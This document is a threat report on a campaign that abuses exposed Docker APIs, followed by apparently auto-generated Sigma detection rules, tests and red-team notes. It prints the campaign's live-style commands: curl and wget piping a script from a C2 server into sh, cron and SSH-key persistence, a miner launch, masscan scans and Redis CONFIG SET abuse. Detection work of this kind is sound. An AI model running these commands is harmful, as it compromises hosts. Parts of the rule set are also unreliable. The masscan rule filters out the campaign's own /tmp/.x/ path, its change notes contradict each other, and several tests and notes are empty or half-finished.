report.title: Threat Report: Opportunistic cryptomining via exposed Docker Engine APIs (Mantis campaign)
report.summary: Since late September 2026, an automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication, starts privileged containers to mount the host root filesystem, drops a shell script, installs cron jobs for persistence, kills competing miners, and deploys an XMRig cryptominer. The campaign uses the host to scan for further victims via masscan and Redis abuse.

behaviors.description: Attacker issues POST /containers/create to exposed Docker Engine API with Binds /:/host and Privileged true to gain host-level access.

observables.note: Parent process of the initial shell
Parent process of the initial shell

behaviors.evidence: The attacker's scanner issues `POST /containers/create` to the exposed API with an Alpine image and `"Binds": ["/:/host"]`, `"Privileged": true`.

behaviors.description: Attacker runs a shell inside a privileged container that downloads and executes an init script from a remote C2 server.

observables.note: Fallback download command when curl missing

behaviors.evidence: The container's entrypoint is: `sh -c "chroot /host sh -c 'curl -fsSL http://45.153.160[.]12/m/init.sh | sh'"`.

behaviors.description: init.sh disables SELinux, increases open file limits, modifies DNS, removes immutable attributes, and tunes kernel parameters to facilitate mining.
behaviors.evidence: It then terminates competing miners and known security agents: `setenforce 0`, `ulimit -n 65535`, `echo "nameserver 8.8.8.8" > /etc/resolv.conf`, `chattr -i /etc/ld.so.preload`, `sysctl -w vm.nr_hugepages=128`.

behaviors.description: init.sh terminates competing miners (xmrig, kinsing, kdevtmpfsi, tsunami) and disables the Alibaba Cloud security agent (aliyun.service).

observables.value: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami
systemctl stop aliyun.service; systemctl disable aliyun.service

behaviors.evidence: It then terminates competing miners and known security agents: `pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami`; `systemctl stop aliyun.service; systemctl disable aliyun.service`.

behaviors.description: Attacker writes cron entries to the root crontab and /etc/cron.d to ensure periodic re-execution of the init script from C2.

observables.note: Cron job file created by attacker
Root crontab entry for periodic execution

behaviors.evidence: The script writes to the root crontab and to `/etc/cron.d`: `(crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh") | crontab -`; `echo "*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh" > /etc/cron.d/mantis`.

behaviors.description: Attacker adds an attacker-controlled SSH public key to root's authorized_keys and sets the file immutable to maintain persistence.
behaviors.evidence: It also adds an attacker-controlled SSH key to `/root/.ssh/authorized_keys` (`ssh-rsa AAAAB3...mantis@c2`) and sets the file immutable with `chattr +i`.

behaviors.description: Miner binary kthreadd is downloaded to /tmp/.x and executed with XMRig pool, wallet, and rig-id arguments over TLS.
behaviors.evidence: The miner is downloaded to a hidden directory and started with a config fetched from the same server: `mkdir -p /tmp/.x; cd /tmp/.x; curl -fsSL http://45.153.160[.]12/m/x86_64 -o /tmp/.x/kthreadd; chmod +x /tmp/.x/kthreadd; nohup /tmp/.x/kthreadd -o pool.mantis-mine[.]cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname) >/dev/null 2>&1 &`.

behaviors.description: Infected host installs masscan and scans /16 ranges for exposed Docker APIs and Redis servers on ports 2375 and 6379.
behaviors.evidence: Infected hosts download `masscan` and scan /16 ranges for additional exposed Docker APIs and Redis servers: `/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt`.

behaviors.description: Redis instances without authentication are abused by writing a cron entry through CONFIG SET dir and CONFIG SET dbfilename.

observables.note: Redis config change to set cron directory
Redis config change to set cron filename

behaviors.evidence: Redis instances without authentication are abused by writing a cron entry through `CONFIG SET dir /var/spool/cron` and `CONFIG SET dbfilename root`.

candidates.title: Shell Execution With Chroot Host And C2 Download
candidates.rationale: The initial container entrypoint runs a shell with `chroot /host` and pipes a remote script from the C2 IP (45.153.160.12) via curl or wget. This command line is highly specific to the Mantis campaign and appears at the very start of the intrusion. Pairing the `chroot /host` pivot with the C2 IP fragment makes the rule resilient to benign container activity.
candidates.false_positive_risks: Legitimate containers might use chroot for filesystem isolation, but they rarely download and execute scripts from a hardcoded external IP in the same command. The rule requires both the chroot pivot and the C2 IP fragment.

candidates.title: Cron File Creation At /etc/cron.d/mantis With C2 Callback
candidates.rationale: The attacker writes a cron job file named `mantis` directly into `/etc/cron.d/` with a command that fetches and executes the init script from the C2 server every 15 minutes. The file path and the embedded C2 URL are durable indicators; cron job creation is a quiet persistence mechanism that is rarely used by legitimate software in this directory.
candidates.false_positive_risks: Some configuration management tools (Ansible, Puppet) may write cron files, but they do not embed a `wget`/`curl` command pointing to 45.153.160.12. The rule keys on the filename `mantis` and the C2 URL fragment.

candidates.title: SSH AuthorizedKeys Modification With Immutable Attribute
candidates.rationale: The campaign adds an attacker-controlled SSH public key to `/root/.ssh/authorized_keys` and immediately sets the immutable attribute (`chattr +i`) to prevent removal. The combination of a write to the root authorized_keys file and the `+i` flag is a strong indicator of malicious persistence.
candidates.false_positive_risks: Administrators may add keys to authorized_keys, but they almost never make the file immutable with `chattr +i`. The rule requires the target path to end with `authorized_keys` and the writing process to be `chattr` (or the file event to show the immutable flag change if available). Since file_event may not capture the command, we rely on the path and the fact that the file becomes immutable; if the telemetry only shows the write, the rule can still key on the path and the presence of a key comment like `mantis@c2`.

candidates.title: XMRig Miner Connection To Mantis Pool Over TLS
candidates.rationale: The miner binary (`kthreadd`) connects to the mining pool `pool.mantis-mine.cc` on port 3333 using TLS, passing a wallet address and a rig-id derived from the hostname. The destination hostname and port are campaign-specific and unlikely to appear in legitimate traffic. The source image is a hidden binary in `/tmp/.x/`.
candidates.false_positive_risks: No legitimate software connects to `pool.mantis-mine.cc`. The rule is highly specific. False positives could only arise if the domain is sinkholed or reused, but the port and TLS miner profile remain distinctive.

candidates.title: Masscan Execution For Docker And Redis Port Scanning
candidates.rationale: Compromised hosts download and run `masscan` to scan /16 networks for exposed Docker APIs (port 2375) and Redis (port 6379) at high rate. The command line includes the binary name `masscan`, the port list `2375,6379`, and a high `--rate` value. This lateral movement step is distinctive and observable at process creation.
candidates.false_positive_risks: Security teams might run masscan for authorized scanning, but they typically use lower rates and specific targets, not broad /16 ranges with a 20000 packet/sec rate from a hidden `/tmp/.x/` directory. The rule combines the binary name, the port pair, and the high-rate flag.

skipped: B1: Covered by D1's parent context (containerd-shim-runc-v2/dockerd spawning the malicious shell). The API call itself is not directly observable in process_creation telemetry.
B3: System hardening commands (setenforce, ulimit, echo, chattr, sysctl) are individually common administrative actions; without multi-event correlation they generate excessive noise.
B4: Killing competing miners (pkill) and stopping aliyun.service are recognizable but the command line overlaps with legitimate cleanup; lower priority than the persistence and impact rules.
B9: Logsource mismatch (dns_query for Redis CONFIG SET commands) and the Redis abuse vector is less consistently observed; also overlaps with lateral movement already covered by D5.
plan.notes: The plan covers Execution (D1), Persistence via cron (D2) and SSH (D3), Impact via miner pool connection (D4), and Lateral Movement (D5). All rules are single-event and use durable command-line, file-path, or network-destination constraints rather than ephemeral IOCs. Three rules use process_creation/linux/docker but with disjoint indicator sets (initial shell, masscan scanner). The network_connection rule for the miner pool provides a clean category separation.

rules.title: Shell Execution With Chroot Host And C2 Download
rules.sigma_yaml:
title: Shell Execution With Chroot Host And C2 Download
id: 92bba233-4c52-44ca-a54f-b40ab1417241
status: experimental
description: Detects the initial container entrypoint running a shell with chroot /host piping a remote script from the Mantis
  C2 server (45.153.160.12) via curl or wget, indicative of opportunistic cryptomining intrusion.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.t1059.001
logsource:
  category: process_creation
  product: linux
  service: docker
detection:
  selection_chroot:
    'CommandLine|contains|all':
    - chroot
    - /host
  selection_c2:
    'CommandLine|contains':
    - 45.153.160.12
  selection_shell:
    'Image|endswith':
    - /sh
    - /bash
  condition: 'all of selection_*'
falsepositives:
- Legitimate containers using chroot for isolation without external script download
- Administrative troubleshooting shells entering host namespace
- Container images with chroot /host in entrypoint for debugging
level: high

tests.label: positive
tests.description: Container entrypoint shell invoking chroot /host with curl download from Mantis C2

tests.label: positive
tests.description: Container entrypoint shell invoking chroot /host with wget download from Mantis C2

tests.label: positive
tests.description: Variation with different shell path and quoting but same chroot /host and C2 IP

tests.label: negative
tests.description: Legitimate container using chroot for isolation without external download

tests.label: negative
tests.description: Administrative shell entering host namespace for troubleshooting

tests.label: negative
tests.description: Container image with chroot /host in entrypoint for debugging, no C2 contact

tests.label: positive
tests.description: Entrypoint uses /bin/bash with full chroot path, mixed quoting, and curl silent flags; preserves chroot /host and C2 IP literals

tests.label: positive
tests.description: Entrypoint uses /usr/bin/sh with wget long options, extra whitespace, and pipe to bash; all required substrings present verbatim

tests.label: positive
tests.description: Entrypoint invokes /bin/sh with single-quoted outer command, double-quoted inner, curl with --fail-early; chroot /host and C2 IP intact

tests.label: positive
tests.description: Entrypoint uses /usr/local/bin/bash (symlink target ends with /bash), full chroot path, wget with -qO-; required fragments all present

tests.label: positive
tests.description: Entrypoint uses /bin/sh with command substitution syntax, extra spaces around pipe; chroot /host and C2 IP survive verbatim

tests.label: negative
tests.description: Legitimate admin debugging container: chroot /host used for namespace inspection but downloads from internal registry IP, not C2

tests.label: negative
tests.description: Container entrypoint for legitimate chroot-based isolation tool; uses chroot /host but no external download

tests.label: negative
tests.description: CI/CD builder container pulling script from corporate artifact server; contains curl and IP but not chroot /host pivot

validation.sql: SELECT * FROM logs WHERE (CommandLine LIKE '%chroot%' ESCAPE '\' AND CommandLine LIKE '%/host%' ESCAPE '\') AND CommandLine LIKE '%45.153.160.12%' ESCAPE '\' AND (Image LIKE '%/sh' ESCAPE '\' OR Image LIKE '%/bash' ESCAPE '\')

conversions.elasticsearch: (CommandLine:*chroot* AND CommandLine:*\/host*) AND CommandLine:*45.153.160.12* AND (Image:(*\/sh OR *\/bash))
conversions.kusto:
DeviceProcessEvents
| where (ProcessCommandLine contains "chroot" and ProcessCommandLine contains "/host") and ProcessCommandLine contains "45.153.160.12" and (FolderPath endswith "/sh" or FolderPath endswith "/bash")
conversions.sqlite: SELECT * FROM logs WHERE (CommandLine LIKE '%chroot%' ESCAPE '\' AND CommandLine LIKE '%/host%' ESCAPE '\') AND CommandLine LIKE '%45.153.160.12%' ESCAPE '\' AND (Image LIKE '%/sh' ESCAPE '\' OR Image LIKE '%/bash' ESCAPE '\')

history.change_summary: Fixed selection_c2 to require only the C2 IP fragment instead of both IP and '|sh', and expanded selection_shell to match both /sh and /bash endpoints to cover variations in shell binaries while preserving the core detection logic.

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/180

rules.author_notes: Rule focuses on the immutable artifacts of the Mantis campaign: chroot /host pivot combined with the hardcoded C2 IP address and final pipe to shell. Test events reflect variations in shell binary, quoting, and download tool while preserving the malicious core. False positives are mitigated by requiring both chroot /host and C2 IP in the same command line.
rules.redteam_analysis: Positive variants P4-P8 demonstrate realistic operator evasions: alternate shell paths (symlinks, /usr/local/bin/bash), mixed quoting styles, extra whitespace, full chroot path (/usr/sbin/chroot), curl/wget flag permutations, and command substitution. All preserve the three literal substrings the rule requires (chroot, /host, 45.153.160.12) and an Image ending in /sh or /bash, so a well-written rule on this logsource catches them. Negative variants N1-N3 are benign look-alikes: admin debugging with internal IP, legitimate chroot isolation without download, and CI/CD builder lacking the chroot /host pivot; none satisfy all three selections simultaneously. Out-of-scope variants highlight fundamental blind spots: OOS1 uses an unexpanded shell variable for the C2 IP so the literal IP never appears in CommandLine; OOS2 uses a renamed shell binary where the sensor lacks OriginalFileName to reveal the true binary; OOS3 changes the C2 IP entirely, which is an infrastructure pivot the current indicator cannot cover without rule modification.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker stores C2 IP in environment variable at image build time; entrypoint expands variable so sensor sees literal IP? Actually if variable expanded at runtime, CommandLine shows expanded value; if passed as literal variable to sh -c, sensor sees $C2_IP. This variant assumes variable passed unexpanded: rule misses because literal IP absent.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses renamed shell binary (e.g., /tmp/.sh) whose OriginalFileName would reveal /bin/sh, but this logsource lacks OriginalFileName field; Image does not end with /sh or /bash so selection_shell fails.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker pivots to different C2 IP (fast-flux infrastructure); behavior identical but IP fragment changes. Rule explicitly keys on 45.153.160.12 so cannot catch without modification.

rules.title: Cron File Mantis Creation With C2 Callback
rules.sigma_yaml:
title: Cron File Mantis Creation With C2 Callback
id: 927240cb-4f9b-4d87-b27b-0d055b806920
status: experimental
description: Detects creation of a cron job file named mantis in /etc/cron.d containing a command to fetch and execute a script
  from the C2 server at 45.153.160.12, indicative of the Mantis cryptomining campaign persistence mechanism.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.persistence
- attack.t1053.005
- attack.execution
- attack.privilege-escalation
logsource:
  category: file_event
  product: linux
  service: cron
detection:
  selection_filename:
    'TargetFilename|endswith': /etc/cron.d/mantis
  selection_command:
    'CommandLine|contains|all':
    - 45.153.160.12
    - /m/init.sh
  condition: selection_filename and selection_command
falsepositives:
- Legitimate configuration management tools creating cron files without the C2 callback
- System administrators manually creating cron jobs in /etc/cron.d for maintenance tasks
- Automated monitoring scripts deploying health checks to /etc/cron.d
level: high

tests.label: positive
tests.description: Attacker creates malicious cron file mantis in /etc/cron.d with wget command to C2 server

tests.label: positive

sed -n '1p' << 'HEREDOC' > /etc/cron.d/mantis
*/15 * * * * root wget -q -O- http://45.153.160.12/m/init.sh | sh
HEREDOC

tests.label: positive
tests.description: Attacker uses zsh shell with different whitespace and single quotes around the cron line

tests.label: positive

cat > /etc/cron.d/mantis << 'END'
*/15 * * * * root wget -q -O- http://45.153.160.12/m/init.sh | sh
END

tests.label: negative

tests.label: negative

validation.sql: SELECT * FROM logs WHERE TargetFilename LIKE '%/etc/cron.d/mantis' ESCAPE '\' AND (CommandLine LIKE '%45.153.160.12%' ESCAPE '\' AND CommandLine LIKE '%/m/init.sh%' ESCAPE '\')

conversions.kusto:
DeviceFileEvents
| where FolderPath endswith "/etc/cron.d/mantis" and (InitiatingProcessCommandLine contains "45.153.160.12" and InitiatingProcessCommandLine contains "/m/init.sh")
conversions.sqlite: SELECT * FROM logs WHERE TargetFilename LIKE '%/etc/cron.d/mantis' ESCAPE '\' AND (CommandLine LIKE '%45.153.160.12%' ESCAPE '\' AND CommandLine LIKE '%/m/init.sh%' ESCAPE '\')

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/0

rules.redteam_analysis: Positive variants P4-P8 preserve both required substrings verbatim in CommandLine, and TargetFilename ends with /etc/cron.d/mantis. They vary the writing binary (tee, printf, sed), shell (zsh, fish), quoting, and whitespace while keeping the durable indicators intact. Negative variants N1-N3 are benign look-alikes: same directory or similar filename but missing the C2 IP and /m/init.sh, or different TargetFilename; they must not match. Out-of-scope variants OOS1-OOS3 represent evasions the file_event logsource cannot reliably catch: symlink resolution changing TargetFilename, bind-mount namespace altering the recorded path, and in-place editing of an existing file which may not generate a creation event with the target filename. A well-written rule on this logsource should catch P4-P8 but cannot be expected to catch OOS1-OOS3 without additional telemetry (e.g., symlink target, mount namespace, or inotify modify events).

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker writes cron file to a symlink /etc/cron.d/mantis -> /tmp/mantis, sensor records resolved TargetFilename without /etc/cron.d/

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses bind mount to hide /etc/cron.d/mantis, sensor sees mount namespace path not matching rule's filename pattern

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker edits existing cron file in-place with sed -i, no new file creation event for /etc/cron.d/mantis

conversions.kusto:
DeviceFileEvents
| where FolderPath endswith "/root/.ssh/authorized_keys" and (InitiatingProcessCommandLine contains "chattr" or InitiatingProcessCommandLine contains "+i")
conversions.sqlite: SELECT * FROM logs WHERE TargetFilename LIKE '%/root/.ssh/authorized\_keys' ESCAPE '\' AND (CommandLine LIKE '%chattr%' ESCAPE '\' OR CommandLine LIKE '%+i%' ESCAPE '\')

history.change_summary: Updated the detection logic to require both 'chattr' and '+i' in the CommandLine field using contains|all semantics, ensuring the rule only matches when the immutable attribute is being set (not removed or other attributes like append-only). This prevents false positives from benign chattr operations such as removing the immutable flag (-i) or setting append-only (+a).

rules.author_notes: The rule assumes availability of CommandLine field in file_event telemetry to detect chattr +i. If CommandLine is not available, detection fidelity decreases and would require correlation with process_creation events.
rules.redteam_analysis: Positive variants P4-P8 demonstrate realistic operator evasions that preserve the literal substrings 'chattr' and '+i' in CommandLine and the exact TargetFilename suffix '/root/.ssh/authorized_keys'. They cover extra whitespace, quoting styles, flag combination (+iA), argument reordering, sudo invocation, and mixed-case binary paths. All would be caught by a well-written rule that uses literal, case-sensitive substring matching on CommandLine and endswith on TargetFilename. Negative variants N1-N3 are benign administrative actions that resemble the attack but differ in either target path or flag polarity, ensuring the rule does not over-match. Out-of-scope variants O1-O3 represent evasions the file_event logsource cannot reliably detect with the current rule fields: a renamed binary lacking 'chattr' in CommandLine, a script using raw syscalls, and a container namespace path shift. These require additional telemetry (OriginalFileName, syscall auditing, or container-aware path correlation) to cover.

redteam_out_of_scope.description: Renamed chattr binary (e.g., /tmp/attr) used to set immutable attribute; CommandLine lacks 'chattr' substring

redteam_out_of_scope.label: positive

redteam_out_of_scope.label: positive

rules.title: Masscan Binary Executed With High Rate Scan On Docker And Redis Ports
rules.sigma_yaml:
title: Masscan Binary Executed With High Rate Scan On Docker And Redis Ports
id: bfc963d1-f7f1-44a1-9c39-980a26801ce0
status: experimental
description: Detects execution of the masscan tool targeting Docker API (2375) and Redis (6379) ports with a high transmission
  rate, indicative of lateral movement scanning activity.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.lateral-movement
- attack.t1021.004
logsource:
  category: process_creation
  product: linux
detection:
  selection_bin:
    'Image|endswith': /masscan
  selection_cmd:
    'CommandLine|contains':
    - 2375,6379
    - --rate
  selection_rate:
    'CommandLine|re': '(?:^|\s)--rate\s+([2-9]|[1-9][0-9])[0-9]{3,}'
  filter_hidden_dir:
    'CommandLine|contains': /tmp/.x/
  filter_expected_admin:
    'CommandLine|contains': /opt/security-tools/
  condition: selection_bin and selection_cmd and selection_rate and not filter_hidden_dir and not filter_expected_admin
falsepositives:
- Authorized network scanning using masscan with lower rates or from expected directories.
level: medium

history.change_summary: Fixed regex pattern to correctly detect rates >= 2000 by changing quantifier from {4,} to {3,} and character class from [3-9] to [2-9]. Updated reference events show the pattern now matches the 15000 rate in P2 while maintaining the original intent of detecting high-rate scans.

Fixed regex for selection_rate to properly match rates >=15000 by allowing digits 2-9 followed by any three or more digits, ensuring P2 matches while maintaining N2 exclusion due to insufficient rate.

Added filter_expected_admin to prevent matching legitimate masscan usage from administrative directories like /opt/security-tools/, while preserving detection of malicious usage from hidden or temporary paths.

history.summary: 6 evasion variants -> positives 8/9, negatives blocked 3/3, benign hits 0/180

history.change_summary: Fixed regex to accept both space and equals separators for --rate argument, ensuring detection of masscan usage with --rate=30000 syntax while maintaining filtering for expected admin tools and hidden directories.
Last refinement regressed; kept the best earlier draft.

rules.author_notes: Rule avoids false positives by requiring both the specific port combination (2375,6379) and a high rate threshold (≥15000 pps), while excluding executions from known hidden paths used in the Mantis campaign. The rate regex captures values 15000 and above to catch variants of the observed 20000 rate.
rules.redteam_analysis:
Positive variants P4-P9 demonstrate realistic evasions that preserve all rule-required literals: Image endswith 'masscan', CommandLine contains '2375,6379' and '--rate', and rate value matches the regex (>=2000). They vary binary location (/opt/tools, /home, /sbin, /var/tmp), parent process (python3, zsh, fish, php-fpm, bash -c), user context (appuser, attacker, www-data, numeric UID), quoting style (single quotes, double quotes, unquoted), whitespace, and rate syntax (--rate=, --rate with extra spaces). A well-written rule keyed on these three literal requirements will catch all six.

Out-of-scope variants OOS1-OOS5 represent evasions that break one or more required literals: renamed binary (OOS1 breaks selection_bin), split port arguments (OOS2 breaks '2375,6379'), short rate flag (OOS3 breaks '--rate'), wrapper script (OOS4 breaks selection_bin), and different tool (OOS5 breaks selection_bin). The process_creation logsource on Linux records the actual executed binary path in Image and the final command line in CommandLine; it cannot see through wrappers or guess intent when the attacker changes the literal strings the rule depends on. These are correctly reported as out-of-scope for the current rule logic.

No negative variants were produced because the rule's false-positive notes already describe authorized scanning with lower rates or from /opt/security-tools/; adding benign look-alikes here would duplicate that coverage. The existing test suite's P1-P3 plus the new positives give sufficient confidence that the rule stays specific while catching the evasions.

redteam_out_of_scope.label: positive
